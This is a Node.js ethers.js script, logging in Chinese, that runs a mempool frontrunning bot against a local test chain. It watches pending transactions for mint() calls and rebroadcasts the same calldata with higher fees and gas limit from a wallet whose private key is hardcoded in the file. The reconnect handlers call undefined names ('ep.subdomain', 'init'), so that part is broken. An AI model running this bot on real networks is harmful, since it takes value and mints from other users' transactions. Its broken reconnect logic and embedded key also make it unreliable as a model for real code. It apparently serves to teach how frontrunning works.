const {ethers, utils} = require("ethers")

const url = "http://127.0.0.1:8545"
const provider = new ethers.providers.WebSocketProvider(url)
const network = provider.getNetwork();
network.then(res => console.log(`[${new Date().toLocaleTimeString()}] 连接到 chainId: ${res.chainId}`))

const iface = new utils.Interface(["function mint() external"])

const privateKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
const wallet = new ethers.Wallet(privateKey, provider)

const main = async () => {
    console.log("监听pending交易，获取txHash，并输出交易详情。")
    provider.on("pending", async (txHash) => {
        if (txHash) {
            console.log("txHash:", txHash)
            const tx = await provider.getTransaction(txHash)
            if (tx) {
                if (tx.data.indexOf(iface.getSighash("mint")) !== -1 && tx.from !== wallet.address) {
                    console.log(`\n[${(new Date).toLocaleTimeString()}] 监听Pending交易: ${txHash} \r`)
                    const parsedTx = iface.parseTransaction(tx)
                    console.log("pending交易解码：")
                    console.log(parsedTx)
                    console.log("raw transaction:")
                    console.log(tx)

                    const txFrontRun = {
                        to: tx.to,
                        value: tx.value,
                        maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 1.2,
                        maxFeePerGas: tx.maxFeePerGas * 1.2,
                        gasLimit:  tx.gasLimit * 2,
                        data: tx.data
                    }
                    const response = await wallet.sendTransaction(txFrontRun)
                    console.log("正在frontrun交易")
                    await response.wait()
                    console.log("frontrun交易成功！")
                }
            }
        }
    })

    provider._websocket.on("error", async () => {
        console.log(`Unable to connect to ${ep.subdomain} retrying in 3s...`);
        setTimeout(init, 3000);
    });

    provider._websocket.on("close", async (code) => {
        console.log(`Connection lost with code ${code}! Attempting reconnect in 3s...`);
        provider._websocket.terminate();
        setTimeout(init, 3000);
    });
}

main()


